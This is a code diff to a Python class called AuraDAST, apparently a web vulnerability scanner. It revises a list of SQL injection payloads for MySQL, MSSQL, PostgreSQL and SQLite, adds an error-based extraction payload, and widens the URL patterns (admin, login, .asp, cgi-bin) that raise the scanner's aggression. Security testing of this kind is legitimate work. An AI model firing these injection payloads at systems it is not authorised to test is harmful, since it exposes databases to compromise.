@@ -135,13 +135,15 @@ class AuraDAST:
             # MySQL
             ("MySQL",      "' UNION SELECT NULL,version(),database()--"),
             ("MySQL",      "' UNION SELECT version(),database(),NULL--"),
-            # MSSQL
-            ("MSSQL",     "' UNION SELECT NULL,@@version,db_name()--"),
+            # MSSQL (Critical for .asp)
+            ("MSSQL",     "' UNION SELECT @@version,NULL,db_name()--"),
             ("MSSQL",     "'; SELECT @@version--"),
             # PostgreSQL
             ("PostgreSQL", "' UNION SELECT NULL,version(),current_database()--"),
             # SQLite
             ("SQLite",     "' UNION SELECT NULL,sqlite_version()--"),
+            # Generic Error Extractor (Aggressive v14.0)
+            ("Generic",    "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT VERSION()), 0x23, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--")
         ]
 
         # Fingerprints: strings that only appear when DB data is in the response
@@ -428,9 +430,9 @@ class AuraDAST:
                             console.print(f"[bold red][!!!] ZENITH HIT: Logic flaw confirmed via semantic manipulation on '{p_name}'.[/bold red]")
                     except: pass
         
-        # v13.0 Stealth Predator: Boost aggression for sensitive paths
-        is_sensitive = any(x in url.lower() for x in ["admin", "manager", "login", "auth"])
-        agg_factor = 2 if is_sensitive else 1
+        # v14.0 [FINAL SIEGE]: Boost aggression for sensitive paths and legacy .asp
+        is_sensitive = any(x in url.lower() for x in ["admin", "manager", "login", "auth", ".asp", ".aspx", "cgi-bin"])
+        agg_factor = 3 if is_sensitive else 1
         
         # v7.4 Velocity Focus: Concurrency Semaphore for payloads
         param_semaphore = asyncio.Semaphore(15) 
